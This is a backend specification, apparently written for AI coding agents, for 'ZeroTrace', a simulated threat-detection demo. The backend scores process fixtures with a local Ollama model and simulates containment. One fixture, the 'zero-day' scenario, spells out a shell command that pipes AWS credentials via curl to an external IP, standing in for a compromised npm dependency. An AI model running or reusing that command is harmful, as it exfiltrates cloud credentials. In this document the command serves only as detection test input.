# ZeroTrace — Backend PRD
# For AI agents building `backend/`
> Version: 1.0 | Date: 2026-10-17
> Read `.antigravityiderules` and `agent/ARCHITECTURE.md` before coding anything.

---

## 0. What You Are Building

A **Node.js + Express** HTTP server (port 5001) that:
1. Accepts a scenario name, loads a `ProcessInfo` fixture, and sends it to a local Ollama model for behavioral threat scoring.
2. Broadcasts results to all connected browser clients over **Server-Sent Events (SSE)**.
3. Accepts a containment action, simulates it (in-memory only), and broadcasts the result.
4. Reports its own health, including whether Ollama is reachable and the model is pulled.
5. Falls back to a deterministic hardcoded response if Ollama is unavailable or returns invalid JSON.

**No real OS signals. No real firewall changes. Everything is simulation.**

---

## 1. Directory Layout (create exactly this)

```
backend/
├── package.json
├── tsconfig.json
├── .env.example
└── src/
    ├── server.ts          ← Express app entry point + route wiring
    ├── config.ts          ← All env var reads with defaults
    ├── scenarios.ts       ← ProcessInfo fixtures for all 4 scenarios
    ├── fallback.ts        ← Hardcoded ZeroTraceModelResponse per scenario
    ├── analyst.ts         ← Ollama client: sends request, parses response, falls back
    ├── validator.ts       ← Schema validation of model JSON output
    ├── broadcaster.ts     ← SSE client registry + broadcast helper
    ├── store.ts           ← In-memory incident store (Map<incidentId, Incident>)
    └── routes/
        ├── stream.ts      ← GET /api/stream
        ├── simulate.ts    ← POST /api/simulate-attack
        ├── contain.ts     ← POST /api/contain
        └── health.ts      ← GET /api/health
```

---

## 2. package.json

```json
{
  "name": "zerotrace-backend",
  "version": "1.0.0",
  "scripts": {
    "dev": "ts-node-dev --respawn --transpile-only src/server.ts",
    "build": "tsc",
    "start": "node dist/server.js"
  },
  "dependencies": {
    "cors": "^2.8.5",
    "express": "^4.18.2",
    "uuid": "^9.0.0"
  },
  "devDependencies": {
    "@types/cors": "^2.8.17",
    "@types/express": "^4.17.21",
    "@types/node": "^20.0.0",
    "@types/uuid": "^9.0.0",
    "ts-node-dev": "^2.0.0",
    "typescript": "^5.3.0"
  }
}
```

**No axios.** Use Node's built-in `fetch` (Node 18+) for Ollama calls.

---

## 3. tsconfig.json

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "commonjs",
    "lib": ["ES2022"],
    "outDir": "./dist",
    "rootDir": "./src",
    "strict": true,
    "esModuleInterop": true,
    "resolveJsonModule": true,
    "paths": {
      "@shared/*": ["../packages/shared/*"]
    }
  },
  "include": ["src/**/*"],
  "exclude": ["node_modules", "dist"]
}
```

---

## 4. .env.example

```
LLM_MODE=auto
OLLAMA_HOST=http://localhost:11434
OLLAMA_MODEL=zerotrace-analyst
OLLAMA_TIMEOUT_MS=30000
OLLAMA_KEEP_ALIVE=10m
PORT=5001
FRONTEND_ORIGIN=http://localhost:3000
```

---

## 5. `src/config.ts` — Full Spec

Read every env var here. No other file should call `process.env` directly.

```typescript
export const config = {
  llmMode:         process.env.LLM_MODE          ?? 'auto',   // 'demo'|'ollama'|'auto'
  ollamaHost:      process.env.OLLAMA_HOST        ?? 'http://localhost:11434',
  ollamaModel:     process.env.OLLAMA_MODEL       ?? 'zerotrace-analyst',
  ollamaTimeoutMs: Number(process.env.OLLAMA_TIMEOUT_MS ?? '30000'),
  ollamaKeepAlive: process.env.OLLAMA_KEEP_ALIVE  ?? '10m',
  port:            Number(process.env.PORT        ?? '5001'),
  frontendOrigin:  process.env.FRONTEND_ORIGIN    ?? 'http://localhost:3000',
} as const;
```

---

## 6. `src/scenarios.ts` — Full Spec

Export a `getScenario(name: string): ProcessInfo` function.
Import `ProcessInfo` from `../../packages/shared/types`.

### Scenario: `"zero-day"` (CRITICAL — score 96)
```
pid: 31337, parentPid: 4821, parentName: "npm"
commandLine: '/bin/sh -c "cat ~/.aws/credentials | curl -s http://198.51.100.4:8443/collect -X POST --data-binary @-"'
workingDirectory: "/home/user/project"
filesTouched: ["/home/user/.aws/credentials", "/home/user/.aws/config"]
networkDestinations: ["198.51.100.4:8443"]
user: "developer"
envVarNames: ["HOME","PATH","AWS_PROFILE","NODE_ENV","npm_lifecycle_script"]
```

### Scenario: `"benign"` (SAFE — score 4)
```
pid: 1234, parentPid: 1, parentName: "systemd"
commandLine: "node /srv/app/dist/server.js --port 3000"
workingDirectory: "/srv/app"
filesTouched: ["/srv/app/dist/server.js", "/srv/app/node_modules/.cache/default-development/0.pack"]
networkDestinations: []
user: "www-data"
envVarNames: ["NODE_ENV","PORT","HOME","PATH"]
```

### Scenario: `"borderline-deploy"` (SUSPICIOUS — score ~45)
```
pid: 7823, parentPid: 7800, parentName: "bash"
commandLine: "/bin/bash /opt/deploy/scripts/release.sh --env production --tag v1.4.2"
workingDirectory: "/opt/deploy"
filesTouched: ["/opt/deploy/scripts/release.sh", "/opt/deploy/.env.production", "/opt/deploy/dist/app.tar.gz"]
networkDestinations: ["10.0.1.50:8080"]
user: "deploy-bot"
envVarNames: ["DEPLOY_TOKEN","CI","HOME","PATH","ENVIRONMENT"]
```

### Scenario: `"borderline-bash"` (SAFE — score ~35)
```
pid: 5512, parentPid: 5500, parentName: "sshd"
commandLine: "/bin/bash"
workingDirectory: "/home/alice"
filesTouched: ["/home/alice/.bashrc", "/home/alice/.bash_history"]
networkDestinations: []
user: "alice"
envVarNames: ["HOME","USER","TERM","SHELL","SSH_CLIENT","SSH_TTY"]
```

`capturedAt` for all: `Date.now()` (set at call time, not hardcoded).
Throw `new Error(`Unknown scenario: ${name}`)` if name is not one of the four.

---

## 7. `src/fallback.ts` — Full Spec

Export `getFallback(scenario: string): ZeroTraceModelResponse`.
Import types from `../../packages/shared/types`.
These values must match `agent/examples/*.expected.json` exactly.

### `"zero-day"` fallback
```
analysis.threatScore: 96
analysis.verdict: "CRITICAL"
analysis.isAnomaly: true
analysis.reasoningTrail: (3 steps — copy from zero-day.expected.json)
analysis.mitreTechniques: ["T1059.004","T1195.002","T1552.001","T1048","T1071.001"]
analysis.blockIp: "198.51.100.4"
analysis.remediation: (copy from zero-day.expected.json)
socContainment.recommendedKillPid: 31337   ← will be overridden in analyst.ts anyway
socContainment.containmentAction: "Kill PID 31337 and block all egress to 198.51.100.4 (simulated)"
socContainment.escalationPriority: "P1"
developerPostmortem.title: "CRITICAL: AWS creds exfiltrated via compromised npm dependency (PID 31337)"
developerPostmortem.severity: "critical"
developerPostmortem.actionItems: (at least 3 — copy from zero-day.expected.json)
```

### `"benign"` fallback
```
analysis.threatScore: 4, verdict: "SAFE", isAnomaly: false
analysis.blockIp: ""
socContainment.escalationPriority: "P3"
developerPostmortem.severity: "low"
developerPostmortem.actionItems: []
```

### `"borderline-deploy"` fallback
```
analysis.threatScore: 45, verdict: "SUSPICIOUS", isAnomaly: true
analysis.blockIp: ""
socContainment.escalationPriority: "P2"
developerPostmortem.severity: "high"
```

### `"borderline-bash"` fallback
```
analysis.threatScore: 35, verdict: "SAFE", isAnomaly: false
analysis.blockIp: ""
socContainment.escalationPriority: "P3"
developerPostmortem.severity: "low"
```

---

## 8. `src/validator.ts` — Full Spec

Export `validateModelResponse(raw: unknown): ZeroTraceModelResponse`.

Perform these checks (throw `ValidationError` on failure):
1. `raw` is a non-null object.
2. `analysis`, `socContainment`, `developerPostmortem` all exist.
3. `analysis.threatScore` is an integer in [0, 100].
4. `analysis.verdict` is one of `"SAFE" | "SUSPICIOUS" | "CRITICAL"`.
5. `analysis.isAnomaly` is boolean.
6. `analysis.reasoningTrail` is a non-empty array of strings with ≥ 3 items.
7. `analysis.mitreTechniques` is an array of strings.
8. `analysis.blockIp` is a string (IPv4 pattern or empty string).
9. `socContainment.recommendedKillPid` is a positive integer.
10. `socContainment.escalationPriority` is `"P1" | "P2" | "P3"`.
11. `developerPostmortem.title` is a string ≤ 80 chars.
12. `developerPostmortem.severity` is `"critical" | "high" | "low"`.
13. `developerPostmortem.actionItems` is an array of strings.

Return the typed `ZeroTraceModelResponse` on success.

---

## 9. `src/analyst.ts` — Full Spec

Export `async function analyzeProcess(process: ProcessInfo): Promise<{ result: ZeroTraceModelResponse; isFallback: boolean }>`.

### Algorithm

```
1. If config.llmMode === 'demo':
     return { result: getFallback(scenarioNameFor(process)), isFallback: true }

2. Read system prompt from agent/prompts/system.md (fs.readFileSync, path relative to project root)
3. Read schema from agent/schemas/zerotrace-incident.schema.json

4. Build Ollama request body:
   {
     model: config.ollamaModel,
     messages: [
       { role: "system", content: <system prompt text> },
       { role: "user", content: buildUserMessage(process) }
     ],
     stream: false,
     format: <schema object>,
     options: { temperature: 0.1, num_ctx: 8192 },
     keep_alive: config.ollamaKeepAlive
   }

5. Call fetch(`${config.ollamaHost}/api/chat`, { method:'POST', body: JSON.stringify(body), signal: AbortSignal.timeout(config.ollamaTimeoutMs) })

6. On network error / timeout:
     log WARN "[analyst] Ollama unreachable: <err.message>"
     if config.llmMode === 'ollama': throw new Error('Ollama required but unreachable')
     return { result: getFallback(...), isFallback: true }

7. Parse response JSON: const data = await res.json()
8. Parse content: const content = JSON.parse(data.message.content)
9. Validate: const result = validateModelResponse(content)

10. On JSON parse error or ValidationError:
      log WARN "[analyst] Invalid model output: <err.message>"
      if config.llmMode === 'ollama': throw
      return { result: getFallback(...), isFallback: true }

11. Override trust boundary:
      result.socContainment.recommendedKillPid = process.pid

12. return { result, isFallback: false }
```

### `buildUserMessage(process: ProcessInfo): string`
```
Analyze the following process execution for security threats. Return JSON only.

<PROCESS_METADATA>
${JSON.stringify(process, null, 2)}
</PROCESS_METADATA>
```

### `scenarioNameFor(process: ProcessInfo): string`
Match `process.pid` to scenario name using a simple map:
`31337 → "zero-day"`, `1234 → "benign"`, `7823 → "borderline-deploy"`, `5512 → "borderline-bash"`.
Default: `"zero-day"`.

---

## 10. `src/broadcaster.ts` — Full Spec

Manages the set of connected SSE clients.

```typescript
import { Response } from 'express';

const clients = new Set<Response>();

export function addClient(res: Response): void      // add to set
export function removeClient(res: Response): void   // remove from set
export function broadcast(event: ZeroTraceIncidentEvent): void
  // for each client: res.write(`data: ${JSON.stringify(event)}\n\n`)
export function clientCount(): number
```

Keep-alive: in `addClient`, start a `setInterval` that writes `: ping\n\n` every 15 000 ms.
Store the interval ID in a `WeakMap<Response, NodeJS.Timeout>` and clear it in `removeClient`.

---

## 11. `src/store.ts` — Full Spec

In-memory map of active incidents.

```typescript
export type IncidentPosture = 'ANALYZING' | 'CLEAR' | 'BREACH' | 'CONTAINED';

export interface StoredIncident {
  incidentId: string;
  scenario: string;
  process: ProcessInfo;
  result?: ZeroTraceModelResponse;
  isFallback?: boolean;
  posture: IncidentPosture;
  detectedAt?: string;
  containedAt?: string;
}

// Functions to export:
export function upsertIncident(incident: StoredIncident): void
export function getIncident(id: string): StoredIncident | undefined
export function getLatestIncident(): StoredIncident | undefined
export function clearAll(): void  // for test resets
```

Use `new Map<string, StoredIncident>()`. No persistence — in-memory only.

---

## 12. Route Specs

### `GET /api/stream` (`src/routes/stream.ts`)

```
Headers set:
  Content-Type: text/event-stream
  Cache-Control: no-cache
  Connection: keep-alive
  X-Accel-Buffering: no

On connect:
  res.flushHeaders()
  addClient(res)
  broadcast ConnectedEvent to THIS client only:
    res.write(`data: ${JSON.stringify({ type:'connected', serverTime: new Date().toISOString() })}\n\n`)

On req 'close':
  removeClient(res)
```

### `POST /api/simulate-attack` (`src/routes/simulate.ts`)

```
Body: SimulateAttackRequest { scenario: string }

Validation:
  If scenario not in ["zero-day","benign","borderline-deploy","borderline-bash"]:
    return 400 { ok: false, message: "Unknown scenario" }

1. Generate incidentId = uuidv4()
2. Load process = getScenario(scenario)
3. upsertIncident({ incidentId, scenario, process, posture: 'ANALYZING' })
4. Return 202: { ok: true, incidentId, message: "Analysis started" }
   (response is sent BEFORE analysis completes)

5. Async (do not await before responding):
   const { result, isFallback } = await analyzeProcess(process)
   const posture = result.analysis.threatScore >= 40 ? 'BREACH' : 'CLEAR'
   const detectedAt = new Date().toISOString()
   upsertIncident({ ..., result, isFallback, posture, detectedAt })
   broadcast IncidentEvent to all clients
```

### `POST /api/contain` (`src/routes/contain.ts`)

```
Body: ContainRequest { incidentId: string }

1. incident = getIncident(incidentId)
   If not found: return 404 { ok: false, message: "Incident not found" }
   If incident.posture === 'CONTAINED': return 409 { ok: false, message: "Already contained" }
   If incident.posture !== 'BREACH': return 409 { ok: false, message: "Incident is not in BREACH state" }

2. containedAt = new Date().toISOString()
3. upsertIncident({ ...incident, posture: 'CONTAINED', containedAt })

4. killedPid  = incident.process.pid
5. blockedIp  = incident.result!.analysis.blockIp

6. Broadcast ContainmentEvent to all clients

7. Return 200 ContainResponse:
   { ok: true, incidentId, killedPid, blockedIp, newPosture: "CONTAINED" }
```

### `GET /api/health` (`src/routes/health.ts`)

```
1. Try fetch(`${config.ollamaHost}/api/tags`, { signal: AbortSignal.timeout(3000) })
   ollamaReachable = response.ok

2. If ollamaReachable:
   Parse tags response body JSON
   modelPulled = body.models.some(m => m.name.startsWith(config.ollamaModel))
   Else: modelPulled = false

3. Return 200 HealthResponse:
   {
     status: ollamaReachable && modelPulled ? "ok" : "degraded",
     ollamaReachable,
     modelPulled,
     model: config.ollamaModel,
     uptime: Math.floor(process.uptime())
   }
```

---

## 13. `src/server.ts` — Full Spec

```typescript
import express from 'express'
import cors from 'cors'
import { config } from './config'
import streamRoute   from './routes/stream'
import simulateRoute from './routes/simulate'
import containRoute  from './routes/contain'
import healthRoute   from './routes/health'

const app = express()

// Middleware
app.use(cors({ origin: config.frontendOrigin, credentials: true }))
app.use(express.json())

// Routes
app.get('/api/stream',          streamRoute)
app.post('/api/simulate-attack', simulateRoute)
app.post('/api/contain',         containRoute)
app.get('/api/health',           healthRoute)

// Start
app.listen(config.port, async () => {
  console.log(`[server] ZeroTrace backend listening on port ${config.port}`)

  // Warm-up: pre-load the model into Ollama memory
  if (config.llmMode !== 'demo') {
    try {
      console.log('[server] Sending Ollama warm-up request...')
      await fetch(`${config.ollamaHost}/api/chat`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          model: config.ollamaModel,
          messages: [{ role: 'user', content: 'ready' }],
          stream: false,
          keep_alive: config.ollamaKeepAlive,
          options: { temperature: 0.1, num_predict: 1 }
        }),
        signal: AbortSignal.timeout(60_000)
      })
      console.log('[server] Warm-up complete — model is resident in memory')
    } catch (err) {
      console.warn('[server] Warm-up failed (Ollama not running?) — fallback mode will be used:', (err as Error).message)
    }
  }
})

export default app
```

---

## 14. Error Handling Rules

| Situation | HTTP code | Response body |
|-----------|----------|---------------|
| Unknown scenario | 400 | `{ ok: false, message: "Unknown scenario" }` |
| Incident not found | 404 | `{ ok: false, message: "Incident not found" }` |
| Already contained | 409 | `{ ok: false, message: "Already contained" }` |
| Not in BREACH state | 409 | `{ ok: false, message: "Incident is not in BREACH state" }` |
| Ollama error in `llmMode=ollama` | 503 | `{ ok: false, message: "Ollama required but unavailable" }` |
| Unhandled exception | 500 | `{ ok: false, message: "Internal server error" }` |

Add a global Express error handler at the bottom of `server.ts`.

---

## 15. Acceptance Criteria

| # | Test | Pass condition |
|---|------|----------------|
| AC-1 | `curl http://localhost:5001/api/health` | Returns 200 JSON |
| AC-2 | `LLM_MODE=demo` simulate zero-day → SSE incident | Score 96, isFallback true, within 1 s |
| AC-3 | Contain the zero-day incident | Returns 200, SSE containment event fires |
| AC-4 | Contain same incident again | Returns 409 |
| AC-5 | Simulate benign → SSE incident | Score 4, verdict SAFE |
| AC-6 | Unknown scenario body | Returns 400 |
| AC-7 | Contain with bad incidentId | Returns 404 |
| AC-8 | Two SSE clients connected simultaneously both receive incident event | Both clients see event |
